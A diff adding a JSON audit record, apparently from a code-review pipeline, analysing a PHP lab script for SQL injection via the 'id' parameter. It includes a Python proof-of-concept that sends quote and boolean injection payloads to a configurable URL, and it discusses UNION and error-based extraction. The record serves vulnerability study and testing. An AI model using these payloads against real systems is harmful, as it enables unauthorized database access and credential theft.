@@ -1,0 +1,132 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["SQLI-001"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "第8行取 GET 参数 id 后未做类型转换、转义或白名单校验；第14行把该值直接插入单引号定界的 SQL 字符串并拼接 LIMIT；第15行 mysql_query 执行拼接结果；整个代码块内不存在 is_numeric、intval、addslashes、mysql_real_escape_string、mysqli/PDO 预处理等防护。危险路径的输入、构造、执行与回显均有静态证据，故定为 high，但未运行，verdict 保持待验证。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入（CWE-89，基于错误/布尔/联合查询）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "入口（第6、8行）：if(isset($_GET['id'])) 成立后 $id=$_GET['id']，值来自 URL 查询串，未做 is_numeric/intval/长度/字符集检查。",
+        "旁路记录（第10至12行）：原始 $id 直接写入 result.txt，未过滤，但不改变查询语义，仅扩大日志注入面。",
+        "构造（第14行）：双引号定界字符串中内插 $id，其位置是 WHERE id= 后的单引号字符串常量内部，属于 SQL 值位置，可被单引号闭合后追加任意 SQL 片段。",
+        "执行（第15行）：拼接结果整体传给 mysql_query，由 MySQL 解析器重新解析，不存在参数绑定，故闭合后的片段会被当作 SQL 语法执行。",
+        "观察点一（第16至23行）：查询成功且返回行时回显 username 与 password 字段，可用于布尔/联合查询的结果判定。",
+        "观察点二（第25至29行）：无返回行时走 else 分支，第28行 print_r(mysql_error()) 输出数据库错误文本，可用于基于错误的判定与报错注入观察。"
+      ],
+      "principle": "用户输入在单引号字符串常量位置被直接拼接进 SQL 文本，未参数化也未转义，输入中的单引号可以提前结束常量，从而把 LIMIT 前的剩余部分改写为任意表达式或 UNION 分支，使 WHERE 条件失效并改变结果集，实现绕过与跨行/跨表读取。",
+      "impact": "可绕过 WHERE id=... LIMIT 0,1 的记录约束，读取 users 表任意行并以明文形式回显用户名和口令；可进一步用 UNION 改变列内容读取同库其他表或数据库元信息，也可利用 mysql_error 回显做基于错误的抽取。未授权访问，因为该分支没有任何会话或权限检查。",
+      "preconditions": [
+        "部署环境中 mysql 扩展可用，mysql_query 能在第15行成功执行（典型为 PHP 5.x 及更早）。",
+        "../sql-connections/sql-connect.php 存在且提供可用连接，数据库中有 users 表且列数与 SELECT * 匹配。",
+        "magic_quotes_gpc 关闭且代码未在别处对 $id 调用 addslashes 或 mysql_real_escape_string。",
+        "GET 参数 id 以字符串形式参与拼接，未被强制整型化。",
+        "需要错误回显时，第28行的 mysql_error() 结果对请求者可见（该行是显式 echo/print_r，不受 error_reporting(0) 抑制）。"
+      ],
+      "counterexamples": [
+        "若第8行改为 $id=intval($_GET['id']) 或增加 is_numeric($id) 校验后再进入第14行，单引号无法进入 SQL，路径阻断。",
+        "若第14/15行改用 mysqli 或 PDO 预处理并以参数绑定传值，即使保留字符串拼接外观也不构成注入。",
+        "若 php.ini 中 magic_quotes_gpc=On 或代码在赋值后调用 addslashes，单引号会被反斜杠转义，注入需要宽字节等额外条件，本块内不成立。",
+        "若部署在 PHP 7 及以上且未加载兼容层，mysql_query 未定义会直接致命错误，查询不会进入数据库，实际无可达执行点。",
+        "若前端或前置 WAF 对 id 参数做严格数字白名单，并且该过滤确实作用于本脚本收到的值，则输入的引号在到达第8行前已被拒绝。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# SQLI-001 local HTTP differential draft; manual adaptation required.\nimport argparse\nimport hashlib\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nSQ = chr(39)\n\nMARKERS = [\n    'Your Login name',\n    'Your Password',\n    'Please input the ID',\n    'You have an error in your SQL syntax',\n    'Warning',\n]\n\ndef load_cookie(path):\n    if not path:\n        return None\n    with open(path, 'r', encoding='utf-8') as fh:\n        raw = fh.read().strip()\n    if not raw:\n        return None\n    if raw.lower().startswith('cookie:'):\n        raw = raw.split(':', 1)[1]\n    parts = [item.strip() for item in raw.splitlines() if item.strip()]\n    return '; '.join(parts) if parts else None\n\ndef fetch(url, cookie, timeout):\n    req = urllib.request.Request(url, method='GET')\n    req.add_header('User-Agent', 'sqli-lab-local-audit/1.0')\n    if cookie:\n        req.add_header('Cookie', cookie)\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as resp:\n            return resp.getcode(), dict(resp.headers), resp.read()\n    except urllib.error.HTTPError as exc:\n        return exc.code, dict(exc.headers), exc.read()\n\ndef summarize(name, status, headers, body):\n    text = body.decode('utf-8', 'replace')\n    hits = [m for m in MARKERS if m in text]\n    location = headers.get('Location', '')\n    digest = hashlib.sha256(body).hexdigest()[:16]\n    print('[%s] status=%s bytes=%d sha256=%s' % (name, status, len(body), digest))\n    if location:\n        print('  location=%s' % location)\n    print('  markers=%s' % (hits if hits else 'none'))\n\ndef main():\n    parser = argparse.ArgumentParser(description='SQLI-001 local HTTP differential draft')\n    parser.add_argument('--base-url', required=True)\n    parser.add_argument('--path', required=True)\n    parser.add_argument('--param', default='id')\n    parser.add_argument('--session-file', default=None)\n    parser.add_argument('--timeout', type=int, default=15)\n    args = parser.parse_args()\n    cookie = load_cookie(args.session_file)\n    payloads = [\n        ('baseline_1', '1'),\n        ('quote_probe', '1' + SQ),\n        ('bool_true', '1' + SQ + ' AND ' + SQ + '1' + SQ + '=' + SQ + '1'),\n        ('bool_false', '1' + SQ + ' AND ' + SQ + '1' + SQ + '=' + SQ + '2'),\n    ]\n    for name, value in payloads:\n        query = urllib.parse.urlencode({args.param: value})\n        url = args.base_url.rstrip('/') + args.path + '?' + query\n        status, headers, body = fetch(url, cookie, args.timeout)\n        summarize(name, status, headers, body)\n\nif __name__ == '__main__':\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+ 标准库（argparse、hashlib、urllib）",
+          "本地靶场可访问，且部署的脚本与本次审计代码一致",
+          "数据库中存在 users 表与 id=1 的测试记录"
+        ],
+        "parameters": [
+          "--base-url 靶场根地址，例如 http://127.0.0.1:8080",
+          "--path 被测脚本路径，例如 /sqli/Less-1/index.php，需按实际部署人工确认",
+          "--param 参数名，默认 id，来自第6、8行的 $_GET['id']",
+          "--session-file 可选，保存 Cookie 头的文本文件，可写 cookie: PHPSESSID=... 或每行一个 name=value",
+          "--timeout 单次请求超时秒数，默认 15"
+        ],
+        "steps": [
+          "先在靶场用浏览器或 curl 取得 id=1 的正常响应，确认页面含 Your Login name 与 Your Password，建立对照基线。",
+          "运行脚本，得到 baseline_1、quote_probe、bool_true、bool_false 四次响应的状态码、字节数、sha256 与关键标记。",
+          "对照 quote_probe 与 baseline_1：若出现 You have an error in your SQL syntax 等数据库错误文本，或响应结构明显变化，说明第14行的单引号被闭合。",
+          "对照 bool_true 与 bool_false：若 true 返回含记录页面而 false 缺失记录段，且重复两次结果稳定，说明输入改变了 WHERE 语义。",
+          "保存响应摘要到本地测试记录，仅使用靶场自带的测试数据，不枚举数据库、不读取额外表、不修改记录。"
+        ],
+        "expected_observation": "baseline_1 返回含 Your Login name 与 Your Password 的页面；quote_probe 返回的正文中出现 SQL 语法错误文本（或与基线明显不同的空记录页）；bool_true 响应接近 baseline_1，bool_false 缺失用户名/口令记录段。",
+        "success_criteria": "重复两次请求下，bool_true 的响应哈希与长度接近 baseline_1，bool_false 稳定不出现 Your Login name 记录段；同时 quote_probe 出现数据库错误文本或结构变化。两组差异同时成立，才支持第14行存在可闭合的注入点。",
+        "limitations": [
+          "脚本未在本环境运行，execution_status 为未运行，不能作为确认依据。",
+          "本环境不执行代码、不访问网络，路径、端口与参数名需按实际部署人工核对，参数名仅用代码中出现的 id。",
+          "若 magic_quotes_gpc=On、$id 被整型化或已改为预处理，四次响应差异会消失，此时应判定为已阻断而非注入。",
+          "差分会受会话失效、认证跳转、PHP 版本不兼容影响，需结合状态码与 Location 头排除误判。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "../sql-connections/sql-connect.php 的内容（连接方式、数据库、字符集、错误模式）",
+    "目标环境的 PHP 版本以及是否仍提供 mysql 扩展",
+    "php.ini 中 magic_quotes_gpc、display_errors、error_reporting 的实际取值",
+    "Web 服务器与路由配置，脚本的真实可达 URL 及是否有前置 WAF 或参数数字校验",
+    "users 表结构、列数及 id=1 测试记录是否存在，以确认 SELECT * 的列匹配与 LIMIT 效果",
+    "该脚本是否被其他页面包含调用，以及是否存在会话或权限前置检查"
+  ],
+  "risk_notes": [
+    "第10至12行把未净化的 $id 原样追加写入 result.txt，存在日志/文件内容注入与伪造审计记录的风险（与本条 SQL 注入分开评估）。",
+    "第28行 print_r(mysql_error()) 向客户端回显数据库错误细节，属于信息泄露，也会放大报错注入的可利用性。",
+    "第16至22行在无认证的 GET 分支中直接回显 username 与 password 明文，凭据暴露风险独立于注入成立与否。",
+    "第4行 error_reporting(0) 可能掩盖其他告警，使运维难以发现异常错误，但不影响第28行显式回显。"
+  ],
+  "quality_notes": [
+    "mysql_* 系列函数自 PHP 5.5 起废弃、PHP 7.0 起移除，代码可移植性与安全性均不足。",
+    "fopen/fwrite/fclose 的返回值未检查，写入失败时可能产生告警。",
+    "include 使用相对路径引用连接文件，依赖当前工作目录。",
+    "SQL 中 LIMIT 0,1 写死为常量，属业务约束而非安全防护，不能替代参数化。"
+  ],
+  "limitations": [
+    "本次仅静态阅读单个代码块，未运行、未联网，判定停留在候选层面，verdict 为待验证。",
+    "连接文件缺失，数据库类型、字符集与转义上下文无法核验，宽字节等字符集相关绕过条件未评估。",
+    "无法确认实际部署的 PHP 版本是否支持 mysql_query，若为 PHP 7 及以上则该执行点不可达。",
+    "POC 为本地差分草案，未执行，不能据此升级为确认；确认需要相同条件下的真实运行证据。"
+  ],
+  "runtime_evidence": []
+}
